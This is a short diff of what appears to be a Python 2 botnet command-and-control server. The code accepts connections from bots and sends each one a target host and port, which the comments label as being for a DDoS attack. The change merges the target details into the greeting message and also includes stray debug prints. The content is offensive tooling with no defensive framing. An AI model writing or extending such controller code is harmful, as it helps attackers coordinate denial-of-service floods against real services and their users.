@@ -58,13 +58,11 @@ while True:
 			c, addr = s_2.accept()    	# Establish connection with client.
 			print 'Got connection from bot 2', addr
 			#c.setblocking(0)
-			c.sendall('Thank you for connecting bot 2')
+			c.sendall(' '.join(['Thank you for connecting bot 2', sys.argv[2], sys.argv[3]]))
 			print 'wefregreger'
-			c.recv(1024)				# Bot acknowledges\
+			c.recv(1024)				# Bot acknowledges !!!THIS WONT RETURN!
 			print 'efegerger'
-			c.send(sys.argv[2])         # Send Host address for DDOS attack
 			#c.recv(1024)				# Bot acknowledges
-			c.send(sys.argv[3])			# Send port number for DDOS attack
 			#c.recv(1024)				# Bot acknowledges
 			conn_bot_2 = 1
 			c.close()                	# Close the connection
